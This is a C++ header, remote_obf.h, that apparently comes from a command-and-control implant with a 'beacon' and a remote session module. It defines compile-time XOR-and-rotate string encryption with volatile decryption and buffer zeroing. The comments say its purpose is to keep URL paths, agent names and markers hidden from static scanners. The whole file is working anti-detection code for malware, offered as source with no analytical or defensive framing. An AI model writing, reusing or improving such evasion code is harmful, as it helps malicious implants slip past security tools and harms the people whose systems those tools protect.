#pragma once
// ============================================================================
//  remote_obf.h — Remote Session module: compile-time string obfuscation
//  ---------------------------------------------------------------------------
//  The remote module is a plain PE/ELF (deliberately separate from the
//  beacon's full evasion stack), but it still ships strings that static
//  scanners hunt for (URL paths, agent names, markers). This layer wraps
//  every protocol-critical literal in constexpr XOR so the plaintext never
//  appears in the binary; strings are decrypted on the stack at runtime and
//  zeroed afterwards.
//  Same technique as the beacon's evasion.h (compile-time XOR + rotate).
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
#endif
#include <cstdint>
#include <cstring>

namespace rob {  // "remote obf" — keep it separate from the beacon's ::obf

constexpr uint8_t XOR_KEY = 0x9E;

template <size_t N>
struct ObfString {
    char data[N]{};
    static constexpr size_t length = N;

    constexpr ObfString(const char (&str)[N]) {
        for (size_t i = 0; i < N; ++i) {
            auto uc = static_cast<unsigned char>(str[i]);
            uc = static_cast<unsigned char>(uc ^ static_cast<unsigned char>(XOR_KEY + i));
            uc = static_cast<unsigned char>((uc << 3) | (uc >> 5));
            data[i] = static_cast<char>(uc);
        }
    }

    void decrypt(char* out) const {
        for (size_t i = 0; i < N; ++i) {
            auto uc = static_cast<unsigned char>(data[i]);
            uc = static_cast<unsigned char>((uc >> 3) | (uc << 5));
            out[i] = static_cast<char>(uc ^ static_cast<unsigned char>(XOR_KEY + i));
        }
    }

    // Volatile-write variant: the optimizer can never fold the decryption
    // into a compile-time constant (a plain `decrypt` into a local buffer
    // gets constant-folded at -O2 and the PLAINTEXT lands in the binary,
    // defeating the whole layer). Volatile stores are observable side
    // effects, so the ciphertext stays in .rdata and the plaintext is only
    // materialized on the stack at runtime.
    void decrypt_volatile(char* out) const {
        volatile char* p = out;
        for (size_t i = 0; i < N; ++i) {
            auto uc = static_cast<unsigned char>(data[i]);
            uc = static_cast<unsigned char>((uc >> 3) | (uc << 5));
            p[i] = static_cast<char>(uc ^ static_cast<unsigned char>(XOR_KEY + i));
        }
    }
};

template <size_t N>
struct DecryptedString {
    char buf[N]{};
    DecryptedString(const ObfString<N>& enc) { enc.decrypt_volatile(buf); }
    ~DecryptedString() {
#ifdef _WIN32
        SecureZeroMemory(buf, N);
#else
        volatile char* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = 0;
#endif
    }
    operator const char*() const { return buf; }
    const char* c_str() const { return buf; }
};

}  // namespace rob

#define R_STR(s) ([]() { constexpr ::rob::ObfString enc(s); return enc; }())
#define R_DEC(enc) ::rob::DecryptedString<decltype(enc)::length>(enc)